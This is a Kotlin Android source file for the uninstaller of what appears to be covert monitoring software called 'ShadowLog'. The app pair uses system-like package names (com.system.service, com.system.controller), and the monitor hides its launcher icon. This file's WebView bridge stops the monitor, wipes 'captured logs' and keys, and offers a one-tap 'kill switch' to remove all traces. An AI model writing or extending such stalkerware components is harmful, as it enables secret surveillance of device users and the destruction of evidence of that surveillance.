package com.system.controller

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity

/**
 * Uninstaller Activity — clean removal tool.
 * Sends commands to Monitor app's ContentProvider to stop service,
 * wipe data, clear config, then triggers system uninstall for both apps.
 */
class UninstallerActivity : AppCompatActivity() {

    private lateinit var webView: WebView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        webView = WebView(this).apply {
            settings.javaScriptEnabled = true
            settings.domStorageEnabled = true
            settings.allowContentAccess = false
            settings.allowFileAccess = false
            webViewClient = WebViewClient()
            addJavascriptInterface(UninstallBridge(), "Android")
        }
        setContentView(webView)
        loadUninstallerUI()
    }

    inner class UninstallBridge {
        @JavascriptInterface
        fun stopService(): Boolean {
            return MonitorClient.sendCommand(this@UninstallerActivity, "stop_service")
        }

        @JavascriptInterface
        fun wipeData(): Boolean {
            return MonitorClient.sendCommand(this@UninstallerActivity, "wipe")
        }

        @JavascriptInterface
        fun clearConfig(): Boolean {
            return MonitorClient.sendCommand(this@UninstallerActivity, "clear_config")
        }

        @JavascriptInterface
        fun showMonitorInLauncher(): Boolean {
            return MonitorClient.sendCommand(this@UninstallerActivity, "show_launcher")
        }

        @JavascriptInterface
        fun uninstallMonitor() {
            try {
                val intent = Intent(Intent.ACTION_DELETE).apply {
                    data = Uri.parse("package:com.system.service")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
            } catch (_: Exception) { }
        }

        @JavascriptInterface
        fun uninstallSelf() {
            try {
                val intent = Intent(Intent.ACTION_DELETE).apply {
                    data = Uri.parse("package:com.system.controller")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
            } catch (_: Exception) { }
        }

        @JavascriptInterface
        fun killSwitch(): Boolean {
            return MonitorClient.sendCommand(this@UninstallerActivity, "kill")
        }

        @JavascriptInterface
        fun goBack() {
            runOnUiThread { finish() }
        }

        @JavascriptInterface
        fun isMonitorInstalled(): Boolean {
            return MonitorClient.isMonitorInstalled(this@UninstallerActivity)
        }
    }

    private fun loadUninstallerUI() {
        val html = """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
            <title>Uninstaller</title>
            <style>
                :root{--primary:#3b82f6;--bg:#0f172a;--card:#1e293b;--text:#f8fafc;--dim:#94a3b8;--border:rgba(255,255,255,0.1);--danger:#ef4444;--success:#10b981;--warning:#f59e0b}
                *{margin:0;padding:0;box-sizing:border-box}
                body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:var(--bg);color:var(--text);padding:16px;min-height:100vh}
                .header{display:flex;align-items:center;gap:12px;padding:12px 0;border-bottom:1px solid var(--border);margin-bottom:16px}
                .back-btn{background:none;border:none;color:var(--primary);font-size:18px;cursor:pointer;padding:4px 8px}
                .header h1{font-size:18px;font-weight:800;flex:1}
                .warn-box{background:rgba(255,61,113,0.08);border:1px solid rgba(255,61,113,0.2);border-radius:12px;padding:14px;margin-bottom:16px;text-align:center}
                .warn-box .icon{font-size:28px;margin-bottom:8px}
                .warn-box .title{font-size:14px;font-weight:700;color:var(--danger);margin-bottom:4px}
                .warn-box .desc{font-size:11px;color:var(--dim)}
                .step{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:14px;margin-bottom:8px;display:flex;align-items:center;gap:12px;cursor:pointer;transition:all 0.15s}
                .step:active{transform:scale(0.98);opacity:0.8}
                .step .num{width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:800;flex-shrink:0}
                .step .num.pending{background:rgba(148,163,184,0.15);color:var(--dim)}
                .step .num.done{background:rgba(16,185,129,0.15);color:var(--success)}
                .step .num.active{background:rgba(59,130,246,0.15);color:var(--primary)}
                .step .info{flex:1}.step .name{font-size:13px;font-weight:600}.step .desc{font-size:10px;color:var(--dim);margin-top:2px}
                .step .status{font-size:10px;font-weight:700;padding:4px 8px;border-radius:6px;background:rgba(148,163,184,0.1);color:var(--dim)}
                .step .status.ready{background:rgba(59,130,246,0.1);color:var(--primary)}
                .step .status.done{background:rgba(16,185,129,0.15);color:var(--success)}
                .step .status.running{background:rgba(251,191,36,0.15);color:var(--warning)}
                .nuke{display:block;width:100%;padding:14px;background:rgba(255,61,113,0.1);border:1px solid rgba(255,61,113,0.3);border-radius:12px;color:var(--danger);font-size:14px;font-weight:700;text-align:center;cursor:pointer;margin-top:20px;transition:all 0.15s}
                .nuke:active{transform:scale(0.97);background:rgba(255,61,113,0.2)}
                .log{font-size:10px;color:var(--dim);font-family:'Courier New',monospace;margin-top:16px;padding:10px;background:var(--card);border-radius:8px;max-height:120px;overflow-y:auto}
            </style>
        </head>
        <body>
            <div class="header">
                <button class="back-btn" onclick="Android.goBack()">←</button>
                <h1>🧹 Uninstaller</h1>
            </div>
            <div class="warn-box">
                <div class="icon">⚠️</div>
                <div class="title">Clean Removal Tool</div>
                <div class="desc">Remove all ShadowLog traces from this device.<br>This cannot be undone.</div>
            </div>
            <div id="step1" class="step" onclick="runStep(1)">
                <div class="num active" id="num1">1</div>
                <div class="info"><div class="name">Stop Service</div><div class="desc">Halt the monitor process</div></div>
                <div class="status ready" id="st1">TAP</div>
            </div>
            <div id="step2" class="step" onclick="runStep(2)">
                <div class="num pending" id="num2">2</div>
                <div class="info"><div class="name">Wipe Data</div><div class="desc">Delete all captured logs</div></div>
                <div class="status ready" id="st2">TAP</div>
            </div>
            <div id="step3" class="step" onclick="runStep(3)">
                <div class="num pending" id="num3">3</div>
                <div class="info"><div class="name">Clear Config</div><div class="desc">Remove all settings and keys</div></div>
                <div class="status ready" id="st3">TAP</div>
            </div>
            <div id="step4" class="step" onclick="runStep(4)">
                <div class="num pending" id="num4">4</div>
                <div class="info"><div class="name">Show Monitor in Launcher</div><div class="desc">Restore hidden app icon</div></div>
                <div class="status ready" id="st4">TAP</div>
            </div>
            <div id="step5" class="step" onclick="runStep(5)">
                <div class="num pending" id="num5">5</div>
                <div class="info"><div class="name">Uninstall Monitor APK</div><div class="desc">Remove com.system.service</div></div>
                <div class="status ready" id="st5">TAP</div>
            </div>
            <div id="step6" class="step" onclick="runStep(6)">
                <div class="num pending" id="num6">6</div>
                <div class="info"><div class="name">Uninstall Controller APK</div><div class="desc">Remove this app (self-destruct)</div></div>
                <div class="status ready" id="st6">TAP</div>
            </div>
            <button class="nuke" onclick="nukeAll()">☢️ KILL SWITCH — Instant Wipe</button>
            <div class="log" id="logArea">Ready. Tap each step or use Kill Switch.</div>
            <script>
                function log(msg){
                    var el=document.getElementById('logArea');
                    el.textContent+='\\n> '+msg;
                    el.scrollTop=el.scrollHeight;
                }
                function markDone(n){
                    document.getElementById('num'+n).className='num done';
                    document.getElementById('num'+n).textContent='✓';
                    document.getElementById('st'+n).className='status done';
                    document.getElementById('st'+n).textContent='DONE';
                }
                function markRunning(n){
                    document.getElementById('num'+n).className='num active';
                    document.getElementById('st'+n).className='status running';
                    document.getElementById('st'+n).textContent='...';
                }
                function runStep(n){
                    markRunning(n);
                    try{
                        switch(n){
                            case 1: var r=Android.stopService();log('Stop service: '+(r?'OK':'skipped'));markDone(1);break;
                            case 2: var r=Android.wipeData();log('Wipe data: '+(r?'OK':'skipped'));markDone(2);break;
                            case 3: var r=Android.clearConfig();log('Clear config: '+(r?'OK':'skipped'));markDone(3);break;
                            case 4: var r=Android.showMonitorInLauncher();log('Show launcher: '+(r?'OK':'skipped'));markDone(4);break;
                            case 5: log('Launching system uninstaller for Monitor...');Android.uninstallMonitor();markDone(5);break;
                            case 6: log('Launching system uninstaller for Controller...');Android.uninstallSelf();markDone(6);break;
                        }
                    }catch(e){log('Error: '+e.message);}
                }
                function nukeAll(){
                    if(!confirm('⚠️ This will immediately wipe ALL data and stop the service. Continue?'))return;
                    log('☢️ KILL SWITCH ACTIVATED');
                    try{
                        markRunning(1);Android.stopService();markDone(1);log('Service stopped');
                        markRunning(2);Android.killSwitch();markDone(2);markDone(3);log('Data wiped + config cleared');
                        markRunning(4);Android.showMonitorInLauncher();markDone(4);log('Launcher restored');
                        log('Done. Uninstall both APKs manually.');
                    }catch(e){log('Kill switch error: '+e.message);}
                }
            </script>
        </body>
        </html>
        """.trimIndent()
        webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)
    }
}
